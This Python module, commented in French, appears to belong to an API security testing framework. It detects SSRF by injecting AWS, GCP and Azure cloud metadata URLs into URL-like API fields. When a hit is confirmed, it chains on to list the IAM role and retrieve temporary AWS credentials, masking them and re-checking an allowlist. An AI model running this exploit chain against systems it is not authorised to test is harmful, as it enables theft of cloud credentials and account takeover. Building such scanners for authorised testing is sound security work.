"""
Detecteur SSRF vers les services de metadonnees cloud (OWASP
API7:2023 - Server Side Request Forgery, EF8 / OS4).

Principe : reperer, dans la specification OpenAPI, des parametres de
type URL (query params sur les endpoints GET, champs de premier
niveau du corps sur les endpoints de creation), puis y injecter des
URLs connues des services de metadonnees AWS/GCP/Azure - le vecteur
ayant permis la breche Capital One (2019). Une reponse est confirmee
vulnerable uniquement si son contenu porte une signature
caracteristique d'une VRAIE reponse de metadonnees (ex: "ami-id"),
jamais sur la base du seul code HTTP - un simple echo de l'URL
soumise (frequent pour un champ "webhook_url") ne doit jamais compter
comme une fuite. Voir config/cloud_metadata_targets.yaml.

Chainage vers l'extraction d'identifiants IAM (AWS) : quand la cible
de metadonnees racine AWS est confirmee, le detecteur tente d'aller
plus loin - lister le role IAM de l'instance, puis recuperer ses
identifiants temporaires - pour transformer "la cible a atteint le
service de metadonnees" en "des identifiants cloud reels ont ete
extraits", preuve d'impact bien plus forte (exactement la chaine
ayant mene a la breche Capital One, 2019). Best effort : si un maillon
de la chaine echoue (role non identifiable, reponse non exploitable),
le finding SSRF de base reste confirme, seule la preuve supplementaire
est absente. ENF5 : les identifiants extraits ne sont JAMAIS stockes
ni affiches en clair - seul un resume masque (AccessKeyId tronque,
presence booleenne du secret/token) est conserve comme preuve.

Perimetre volontairement restreint (ENF2 - non-destructivite) :
  - endpoints GET sans parametre de chemin (pas besoin de deviner un
    ID de ressource existante) ;
  - endpoints de creation (POST) deja consideres surs par
    FixtureManager (memes exclusions que les autres detecteurs).
Les endpoints de modification (PUT/PATCH sur une ressource existante)
ne sont pas testes dans cette version, pour eviter d'alterer l'etat
d'une ressource dont l'ID n'a pas ete verifie comme disponible pour
les tests.

C'est le detecteur le plus sensible du framework (risque d'exposition
reelle d'identifiants cloud si la cible est vulnerable) : il
re-verifie explicitement l'allowlist avant de s'executer, en plus de
la verification deja faite par SessionManager (ENF2, EF8).

Timeout volontairement genereux (35s par defaut) : constate
empiriquement sur crAPI (endpoint contact_mechanic/mechanic_api,
23.4s mesures), une cible qui tente reellement de contacter
169.254.169.254 depuis un environnement sans metadonnees cloud reelles
(Docker local, pas une vraie instance AWS/GCP/Azure) met plusieurs
secondes a echouer proprement cote serveur. Un timeout client trop
court (6s initialement, puis 20s - encore insuffisant, mesure sur le
fil) coupe la connexion avant que le serveur n'ait fini sa propre
tentative - le test echoue silencieusement (aucune preuve enregistree)
sans que ce soit une absence de vulnerabilite. Limite residuelle
documentee : sur une cible non hebergee sur du vrai cloud, la
CONFIRMATION par signature de contenu reste structurellement
impossible (aucune vraie reponse de metadonnees a recevoir), meme avec
un timeout suffisant pour observer l'echec cote serveur.
"""

import logging
import re
from pathlib import Path
from typing import Optional

import requests
import yaml

from api_sentinel.accounts.session_manager import Account, SessionManager
from api_sentinel.detectors.base_detector import Finding, OwaspCategory, Severity
from api_sentinel.discovery.openapi_parser import Endpoint
from api_sentinel.evidence.evidence_store import EvidenceStore
from api_sentinel.fixtures.fixture_manager import FixtureManager
from api_sentinel.fixtures.payload_generator import PayloadGenerator, SchemaResolutionError

logger = logging.getLogger(__name__)


class CloudMetadataTarget:
    """
    Une URL de service de metadonnees cloud a injecter, avec les
    signatures de contenu qui prouvent qu'elle a reellement ete
    atteinte cote serveur.
    """

    def __init__(
        self,
        provider: str,
        url: str,
        response_signatures: list[str],
        note: str = "",
        iam_role_list_url: Optional[str] = None,
        iam_credentials_url_template: Optional[str] = None,
    ):
        self.provider = provider
        self.url = url
        self.note = note
        self.response_signatures = self._filter_unsafe_signatures(response_signatures)
        self.iam_role_list_url = iam_role_list_url
        self.iam_credentials_url_template = iam_credentials_url_template

    def supports_iam_chaining(self) -> bool:
        return bool(self.iam_role_list_url and self.iam_credentials_url_template)

    def _filter_unsafe_signatures(self, signatures: list[str]) -> list[str]:
        """
        Ecarte toute signature qui serait une sous-chaine de l'URL
        elle-meme : sinon un endpoint qui se contente de refleter
        l'URL soumise (sans jamais la recuperer) declencherait un
        faux positif garanti.
        """
        safe = []
        lowered_url = self.url.lower()
        for sig in signatures:
            if sig.lower() in lowered_url:
                logger.warning(
                    "Signature '%s' ignoree pour la cible %s (%s) - elle "
                    "est une sous-chaine de l'URL injectee, donc "
                    "inutilisable sans faux positif par simple echo.",
                    sig, self.provider, self.url,
                )
                continue
            safe.append(sig)
        return safe

    def matches(self, response_text: str) -> list[str]:
        """Retourne les signatures effectivement retrouvees dans la reponse."""
        if not response_text:
            return []
        lowered = response_text.lower()
        return [sig for sig in self.response_signatures if sig.lower() in lowered]


class URLFieldDiscovery:
    """
    Reperage des points d'injection SSRF potentiels dans la
    specification OpenAPI : query params et champs de premier niveau
    du corps de requete dont le nom, le format OU la valeur d'exemple
    suggerent une URL.

    Le troisieme signal (exemple) est important : beaucoup d'API
    exposent des champs qui recoivent bel et bien une URL cote serveur
    sans que ce soit visible dans leur nom ni leur format - ex. crAPI
    expose un champ "mechanic_api" (aucun mot-cle "url" dans le nom,
    pas de format: uri declare) dont l'exemple officiel est
    "http://localhost:8000/...". Sans se baser sur l'exemple, ce
    champ - qui est le vecteur SSRF documente de crAPI - passerait
    inapercu.
    """

    URI_FORMATS = {"uri", "url", "uri-reference", "iri"}
    URL_VALUE_PATTERN = re.compile(r"^https?://", re.IGNORECASE)

    def __init__(self, raw_spec: dict, keywords_config: str):
        self.components = raw_spec.get("components", {}).get("schemas", {})
        self.keywords = self._load_keywords(keywords_config)

    def _load_keywords(self, config_path: str) -> list[str]:
        path = Path(config_path)
        if not path.exists():
            raise FileNotFoundError(f"Fichier de mots-cles URL introuvable : {path}")
        content = yaml.safe_load(path.read_text(encoding="utf-8"))
        return [k.lower() for k in content.get("url_field_keywords", [])]

    def find_query_params(self, endpoint: Endpoint) -> list[str]:
        found = []
        for param in endpoint.parameters:
            if param.get("in") != "query":
                continue
            example_value = param.get("example") or param.get("schema", {}).get("example")
            if self._looks_like_url(param.get("name", ""), param.get("schema", {}), example_value):
                found.append(param["name"])
        return found

    def find_body_fields(self, operation: dict) -> list[str]:
        request_body = operation.get("requestBody")
        if not request_body:
            return []

        content = request_body.get("content", {}).get("application/json", {})
        schema = content.get("schema")
        if not schema:
            return []

        schema = self._resolve(schema)
        properties = schema.get("properties", {})

        # Exemple global au niveau du corps de requete (ex: crAPI),
        # potentiellement different d'un exemple par propriete.
        whole_body_example = content.get("example")
        if not isinstance(whole_body_example, dict):
            whole_body_example = {}

        found = []
        for field_name, field_schema in properties.items():
            resolved_schema = self._resolve(field_schema)
            example_value = (
                resolved_schema.get("example")
                if resolved_schema.get("example") is not None
                else whole_body_example.get(field_name)
            )
            if self._looks_like_url(field_name, resolved_schema, example_value):
                found.append(field_name)
        return found

    def _resolve(self, schema: dict) -> dict:
        if "$ref" not in schema:
            return schema
        ref = schema["$ref"]
        if not ref.startswith("#/components/schemas/"):
            return {}
        return self.components.get(ref.split("/")[-1], {})

    def _looks_like_url(self, field_name: str, schema: dict, example_value=None) -> bool:
        if schema.get("format") in self.URI_FORMATS:
            return True
        if self._is_url_shaped(example_value):
            return True
        if schema.get("type") not in (None, "string"):
            return False
        normalized = field_name.lower()
        return any(keyword in normalized for keyword in self.keywords)

    def _is_url_shaped(self, value) -> bool:
        return isinstance(value, str) and bool(self.URL_VALUE_PATTERN.match(value))


def load_cloud_targets(config_path: str) -> list[CloudMetadataTarget]:
    path = Path(config_path)
    if not path.exists():
        raise FileNotFoundError(f"Fichier de cibles de metadonnees cloud introuvable : {path}")

    content = yaml.safe_load(path.read_text(encoding="utf-8"))
    targets = [
        CloudMetadataTarget(
            provider=entry["provider"],
            url=entry["url"],
            response_signatures=entry.get("response_signatures", []),
            note=entry.get("note", ""),
            iam_role_list_url=entry.get("iam_role_list_url"),
            iam_credentials_url_template=entry.get("iam_credentials_url_template"),
        )
        for entry in content.get("cloud_metadata_targets", [])
    ]
    logger.info("%d cible(s) de metadonnees cloud chargee(s) depuis %s.", len(targets), path)
    return targets


# --- Chaine d'extraction d'identifiants IAM (AWS) ---
#
# Fonctions pures (pas d'etat, pas de reseau) pour pouvoir etre
# testees unitairement sans dependre de reponses HTTP reelles.

_ROLE_NAME_TOKEN = re.compile(r"[A-Za-z0-9+=,.@_-]{3,64}")

# Tokens frequents dans un wrapper JSON (cles, mots-cles) susceptibles
# de matcher le pattern ci-dessus mais qui ne sont jamais un nom de
# role IAM - a exclure pour ne pas les prendre par erreur pour un role.
_ROLE_NAME_NOISE = {
    "data", "result", "results", "response", "content", "value", "body",
    "url", "fetched", "output", "status", "success", "error", "errors",
    "message", "true", "false", "null", "http", "https", "not", "found",
}

_ACCESS_KEY_ID_PATTERN = re.compile(r'AccessKeyId"?\s*[:=]\s*"?([A-Za-z0-9]{16,32})')
_EXPIRATION_PATTERN = re.compile(r'Expiration"?\s*[:=]\s*"?([0-9T:\.\-Z]+)')


def extract_role_name(text: Optional[str]) -> Optional[str]:
    """
    Best effort : extrait un nom de role IAM plausible depuis la
    reponse (texte brut ou JSON simple) d'un endpoint
    iam/security-credentials/. Un role errone ne casse rien : l'etape
    suivante de la chaine echouera proprement faute d'identifiants
    exploitables.
    """
    if not text:
        return None

    for candidate in _ROLE_NAME_TOKEN.findall(text):
        if candidate.lower() in _ROLE_NAME_NOISE:
            continue
        if candidate.replace(".", "").isdigit():
            continue
        return candidate
    return None


def summarize_credentials(text: Optional[str]) -> Optional[dict]:
    """
    Verifie qu'une reponse contient bien des identifiants IAM
    temporaires (AccessKeyId + SecretAccessKey presents ensemble -
    l'un sans l'autre n'est pas une preuve suffisante) et construit un
    resume masque, sans jamais exposer la cle secrete ou le jeton de
    session reels (ENF5).
    """
    if not text or "AccessKeyId" not in text or "SecretAccessKey" not in text:
        return None

    access_key_match = _ACCESS_KEY_ID_PATTERN.search(text)
    if not access_key_match:
        return None

    access_key_id = access_key_match.group(1)
    masked = (
        f"{access_key_id[:4]}...{access_key_id[-4:]}"
        if len(access_key_id) > 8
        else "***"
    )

    expiration_match = _EXPIRATION_PATTERN.search(text)

    return {
        "access_key_id_masked": masked,
        "secret_access_key_present": True,
        "session_token_present": "Token" in text,
        "expiration": expiration_match.group(1) if expiration_match else None,
    }


class SSRFCloudDetector:

    DETECTOR_NAME = "ssrf_cloud"

    def __init__(
        self,
        fixture_manager: FixtureManager,
        payload_generator: PayloadGenerator,
        session_manager: SessionManager,
        evidence_store: EvidenceStore,
        url_field_discovery: URLFieldDiscovery,
        cloud_targets: list[CloudMetadataTarget],
        request_timeout: int = 35,
    ):
        self.fixture_manager = fixture_manager
        self.payload_generator = payload_generator
        self.session_manager = session_manager
        self.evidence_store = evidence_store
        self.url_field_discovery = url_field_discovery
        self.cloud_targets = cloud_targets
        self.request_timeout = request_timeout
        self.findings: list[Finding] = []

    def run(self, roles: list[str] | None = None) -> list[Finding]:
        if roles is None:
            roles = ["attacker_same_level"]

        if not self.cloud_targets:
            logger.warning("Aucune cible de metadonnees cloud configuree - rien a tester.")
            return []

        # EF8 / ENF2 : re-verification explicite, en plus de celle deja
        # faite par SessionManager - c'est le detecteur le plus a
        # risque du framework, il ne doit jamais tourner "par defaut".
        self.session_manager.allowlist.enforce(self.session_manager.base_url)

        get_endpoints = [
            ep for ep in self.fixture_manager.endpoints
            if ep.method == "GET" and not ep.has_path_param
        ]
        creation_endpoints = self.fixture_manager.get_creation_endpoints()

        for role in roles:
            account = self.session_manager.get_account(role)

            for endpoint in get_endpoints:
                self._test_query_params(endpoint, account)

            for endpoint in creation_endpoints:
                self._test_body_fields(endpoint, account)

        logger.info(
            "Detecteur SSRF cloud termine : %d finding(s) confirme(s).",
            len(self.findings),
        )
        return self.findings

    def _test_query_params(self, endpoint: Endpoint, account: Account) -> None:
        url_fields = self.url_field_discovery.find_query_params(endpoint)
        if not url_fields:
            return

        for field_name in url_fields:
            for target in self.cloud_targets:
                def rebuild(injected_url, _endpoint=endpoint, _field=field_name):
                    return self._build_query_params(_endpoint, _field, injected_url), None

                params, json_body = rebuild(target.url)
                response, timed_out = self._send(endpoint.method, endpoint.path, account, params, json_body)
                self._evaluate(
                    response=response, timed_out=timed_out, target=target, endpoint=endpoint,
                    account=account, injection_point=f"query:{field_name}",
                    params=params, json_body=json_body, rebuild=rebuild,
                )

    def _build_query_params(self, endpoint: Endpoint, injected_field: str, injected_value: str) -> dict:
        params = {}
        for param in endpoint.parameters:
            if param.get("in") != "query":
                continue
            name = param.get("name")
            if name == injected_field:
                params[name] = injected_value
            elif param.get("required"):
                try:
                    params[name] = self.payload_generator._generate_value(
                        param.get("schema", {}), depth=0
                    )
                except SchemaResolutionError:
                    logger.debug(
                        "Parametre requis '%s' non generable sur %s, test "
                        "tente quand meme sans lui.", name, endpoint.path,
                    )
        return params

    def _test_body_fields(self, endpoint: Endpoint, account: Account) -> None:
        operation = self.fixture_manager._get_operation_definition(endpoint)
        url_fields = self.url_field_discovery.find_body_fields(operation)
        if not url_fields:
            return

        base_payload = self.payload_generator.generate_for_request_body(operation)
        if base_payload is None:
            return

        for field_name in url_fields:
            for target in self.cloud_targets:
                def rebuild(injected_url, _base=base_payload, _field=field_name):
                    payload = dict(_base)
                    payload[_field] = injected_url
                    return None, payload

                params, json_body = rebuild(target.url)
                response, timed_out = self._send(endpoint.method, endpoint.path, account, params, json_body)
                self._evaluate(
                    response=response, timed_out=timed_out, target=target, endpoint=endpoint,
                    account=account, injection_point=f"body:{field_name}",
                    params=params, json_body=json_body, rebuild=rebuild,
                )

    def _send(
        self, method: str, path: str, account: Account,
        params: Optional[dict], json_body: Optional[dict],
    ) -> tuple[Optional[requests.Response], bool]:
        """Retourne (reponse, timed_out) - timed_out distingue un depassement
        de delai (signal faible d'une connexion sortante reelle, cf. plus
        bas) d'une autre erreur reseau (connexion refusee, DNS...), qui
        n'apporte aucune preuve."""
        url = f"{account.base_url}{path}"
        try:
            response = requests.request(
                method, url,
                headers=account.auth_headers(),
                params=params,
                json=json_body,
                timeout=self.request_timeout,
            )
            return response, False
        except requests.Timeout:
            logger.debug(
                "Timeout (%ss) lors du test SSRF sur %s - signal faible "
                "possible d'une connexion sortante reelle en cours.",
                self.request_timeout, url,
            )
            return None, True
        except requests.RequestException as exc:
            logger.debug("Erreur reseau lors du test SSRF sur %s : %s", url, exc)
            return None, False

    def _evaluate(
        self,
        response: Optional[requests.Response],
        timed_out: bool,
        target: CloudMetadataTarget,
        endpoint: Endpoint,
        account: Account,
        injection_point: str,
        params: Optional[dict],
        json_body: Optional[dict],
        rebuild,
    ) -> None:
        if response is None:
            if timed_out:
                self._record_timeout_signal(
                    target=target, endpoint=endpoint, account=account,
                    injection_point=injection_point, params=params, json_body=json_body,
                )
            return

        matched_signatures = target.matches(response.text)
        confirmed = bool(matched_signatures)

        evidence = self.evidence_store.record(
            detector=self.DETECTOR_NAME,
            request_method=endpoint.method,
            request_url=f"{account.base_url}{endpoint.path}",
            request_headers=account.auth_headers(),
            request_body=json_body if json_body is not None else params,
            response_status=response.status_code,
            response_body={"raw_excerpt": response.text[:500]},
            finding_confirmed=confirmed,
        )

        if not confirmed:
            return

        self._record_finding(
            path=endpoint.path, method=endpoint.method, account=account, target=target,
            injection_point=injection_point, matched_signatures=matched_signatures,
            evidence_test_id=evidence.test_id,
        )

        if target.supports_iam_chaining():
            self._attempt_iam_credential_extraction(
                endpoint=endpoint, account=account, target=target,
                injection_point=injection_point, rebuild=rebuild,
            )

    def _record_timeout_signal(
        self, target: CloudMetadataTarget, endpoint: Endpoint, account: Account,
        injection_point: str, params: Optional[dict], json_body: Optional[dict],
    ) -> None:
        """
        Un depassement du timeout (deliberement genereux, cf. docstring du
        module) en injectant une URL de metadonnees cloud est un signal
        FAIBLE mais reel : un champ qui se contente d'un echo ou d'une
        validation locale repond en millisecondes, jamais en dizaines de
        secondes. Enregistre comme finding distinct, severite et confiance
        nettement plus basses qu'une confirmation par signature de contenu
        (ENF1) - a verifier manuellement (ex: capture reseau cote serveur).
        """
        evidence = self.evidence_store.record(
            detector=self.DETECTOR_NAME,
            request_method=endpoint.method,
            request_url=f"{account.base_url}{endpoint.path}",
            request_headers=account.auth_headers(),
            request_body=json_body if json_body is not None else params,
            response_status=0,
            response_body={
                "note": f"Timeout client apres {self.request_timeout}s, aucune reponse recue."
            },
            finding_confirmed=True,
        )

        finding = Finding(
            detector=self.DETECTOR_NAME,
            owasp_category=OwaspCategory.SSRF,
            severity=Severity.MEDIUM,
            confidence=0.4,
            title=(
                f"SSRF probable (NON confirme par contenu) sur "
                f"{endpoint.method} {endpoint.path} : le champ "
                f"'{injection_point}' a provoque un depassement de delai "
                f"({self.request_timeout}s) en pointant vers "
                f"{target.url} ({target.provider.upper()})."
            ),
            description=(
                f"Aucune reponse recue apres {self.request_timeout}s alors que "
                f"les autres requetes a cette cible repondent normalement en "
                f"quelques centaines de millisecondes. Un champ qui se "
                f"contente d'un echo ou d'une validation locale ne peut pas "
                f"provoquer un tel delai - ce comportement suggere fortement "
                f"une tentative de connexion sortante reelle vers l'URL "
                f"injectee, meme si son contenu (donc la preuve forte de "
                f"metadonnees exposees) n'a pas pu etre recupere dans le "
                f"delai imparti. A verifier manuellement (augmenter encore "
                f"le timeout, ou capturer le trafic sortant du serveur) "
                f"avant de considerer ce finding comme une preuve definitive."
            ),
            affected_endpoint=f"{endpoint.method} {endpoint.path}",
            evidence_test_id=evidence.test_id,
            victim_role="N/A",
            attacker_role=account.role,
        )
        self.findings.append(finding)
        logger.warning("FINDING CONFIRME (signal faible) : %s", finding.title)

    def _attempt_iam_credential_extraction(
        self, endpoint: Endpoint, account: Account, target: CloudMetadataTarget,
        injection_point: str, rebuild,
    ) -> None:
        logger.info(
            "Metadonnees %s confirmees sur %s (%s) - tentative d'extraction "
            "d'un role IAM pour prouver l'impact reel (chaine type breche "
            "Capital One).", target.provider.upper(), endpoint.path, injection_point,
        )

        role_params, role_json = rebuild(target.iam_role_list_url)
        role_response, _ = self._send(endpoint.method, endpoint.path, account, role_params, role_json)
        if role_response is None:
            return

        role_name = extract_role_name(role_response.text)
        if not role_name:
            logger.info(
                "Liste des roles IAM non exploitable depuis la reponse de "
                "%s - le finding SSRF de base reste confirme, sans preuve "
                "d'identifiants supplementaire.", endpoint.path,
            )
            return

        creds_url = target.iam_credentials_url_template.format(role=role_name)
        creds_params, creds_json = rebuild(creds_url)
        creds_response, _ = self._send(endpoint.method, endpoint.path, account, creds_params, creds_json)
        if creds_response is None:
            return

        proof = summarize_credentials(creds_response.text)
        if proof is None:
            logger.info(
                "Role IAM '%s' identifie mais aucun identifiant exploitable "
                "trouve dans la reponse - extraction de la chaine arretee.",
                role_name,
            )
            return

        evidence = self.evidence_store.record(
            detector=self.DETECTOR_NAME,
            request_method=endpoint.method,
            request_url=f"{account.base_url}{endpoint.path}",
            request_headers=account.auth_headers(),
            request_body=creds_json if creds_json is not None else creds_params,
            response_status=creds_response.status_code,
            # Jamais la reponse brute ici : elle contiendrait des
            # identifiants cloud reels. Seul le resume masque (ENF5)
            # est conserve comme preuve.
            response_body={"credential_proof": proof},
            finding_confirmed=True,
        )

        self._record_iam_finding(
            path=endpoint.path, method=endpoint.method, account=account,
            role_name=role_name, proof=proof, evidence_test_id=evidence.test_id,
        )

    def _record_iam_finding(
        self, path: str, method: str, account: Account,
        role_name: str, proof: dict, evidence_test_id: str,
    ) -> None:
        expiration_note = f", expire le {proof['expiration']}" if proof.get("expiration") else ""
        finding = Finding(
            detector=self.DETECTOR_NAME,
            owasp_category=OwaspCategory.SSRF,
            severity=Severity.CRITICAL,
            confidence=0.99,
            title=(
                f"SSRF -> extraction d'identifiants IAM confirmee sur "
                f"{method} {path} : identifiants temporaires du role "
                f"'{role_name}' recuperes via les metadonnees AWS."
            ),
            description=(
                f"En chainant l'injection SSRF confirmee avec les endpoints "
                f"IAM de metadonnees AWS, la cible a retourne des "
                f"identifiants temporaires valides pour le role "
                f"'{role_name}' (AccessKeyId {proof['access_key_id_masked']}, "
                f"SecretAccessKey presente : {proof['secret_access_key_present']}, "
                f"session token present : {proof['session_token_present']}"
                f"{expiration_note}). Les valeurs completes ne sont jamais "
                f"stockees ni affichees par le framework (ENF5) - cette "
                f"preuve suffit a demontrer l'impact reel (acces au compte "
                f"cloud de la cible) sans manipuler de secret reel. Vecteur "
                f"identique a la breche Capital One (2019)."
            ),
            affected_endpoint=f"{method} {path}",
            evidence_test_id=evidence_test_id,
            victim_role="N/A",
            attacker_role=account.role,
        )
        self.findings.append(finding)
        logger.critical("FINDING CRITIQUE CONFIRME (identifiants cloud extraits) : %s", finding.title)

    def _record_finding(
        self, path: str, method: str, account: Account, target: CloudMetadataTarget,
        injection_point: str, matched_signatures: list[str], evidence_test_id: str,
    ) -> None:
        finding = Finding(
            detector=self.DETECTOR_NAME,
            owasp_category=OwaspCategory.SSRF,
            severity=Severity.CRITICAL,
            confidence=self._compute_confidence(matched_signatures),
            title=(
                f"SSRF confirme sur {method} {path} : le champ "
                f"'{injection_point}' a permis d'atteindre le service de "
                f"metadonnees {target.provider.upper()} ({target.url})."
            ),
            description=(
                f"La reponse contient {len(matched_signatures)} signature(s) "
                f"caracteristique(s) des metadonnees {target.provider.upper()} "
                f"({', '.join(matched_signatures)}), retournee(s) apres avoir "
                f"rempli le champ '{injection_point}' avec l'URL du service de "
                f"metadonnees au lieu d'une valeur normale. Ce vecteur a "
                f"notamment permis la breche Capital One (2019)."
            ),
            affected_endpoint=f"{method} {path}",
            evidence_test_id=evidence_test_id,
            victim_role="N/A",
            attacker_role=account.role,
        )
        self.findings.append(finding)
        logger.warning("FINDING CONFIRME : %s", finding.title)

    def _compute_confidence(self, matched_signatures: list[str]) -> float:
        if len(matched_signatures) >= 3:
            return 0.97
        if len(matched_signatures) == 2:
            return 0.9
        return 0.75


if __name__ == "__main__":
    import sys

    from api_sentinel.discovery.openapi_parser import OpenAPIParser

    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

    if len(sys.argv) < 3:
        print(
            "Usage : python ssrf_cloud.py <openapi.json> <accounts.yaml> "
            "[excluded_actions.yaml] [cloud_metadata_targets.yaml] "
            "[ssrf_url_field_keywords.yaml]"
        )
        sys.exit(1)

    excluded_config = sys.argv[3] if len(sys.argv) > 3 else "config/excluded_action_endpoints.yaml"
    cloud_targets_config = sys.argv[4] if len(sys.argv) > 4 else "config/cloud_metadata_targets.yaml"
    url_keywords_config = sys.argv[5] if len(sys.argv) > 5 else "config/ssrf_url_field_keywords.yaml"

    parser = OpenAPIParser(sys.argv[1])
    endpoints = parser.parse()

    session_manager = SessionManager(sys.argv[2])
    session_manager.authenticate_all()

    fixture_manager = FixtureManager(
        endpoints=endpoints,
        raw_openapi_spec=parser.raw_spec,
        session_manager=session_manager,
        excluded_keywords_config=excluded_config,
    )

    payload_generator = PayloadGenerator(parser.raw_spec)
    evidence_store = EvidenceStore("evidence/ssrf_cloud_evidence.jsonl")
    url_field_discovery = URLFieldDiscovery(parser.raw_spec, url_keywords_config)
    cloud_targets = load_cloud_targets(cloud_targets_config)

    detector = SSRFCloudDetector(
        fixture_manager=fixture_manager,
        payload_generator=payload_generator,
        session_manager=session_manager,
        evidence_store=evidence_store,
        url_field_discovery=url_field_discovery,
        cloud_targets=cloud_targets,
    )
    findings = detector.run()

    print(f"\n{len(findings)} faille(s) SSRF cloud confirmee(s) :\n")
    for f in findings:
        print(f"  [{f.severity.value.upper()}] {f.title} (confiance: {f.confidence:.0%})")

    if not findings:
        print("Aucune faille SSRF cloud detectee.")
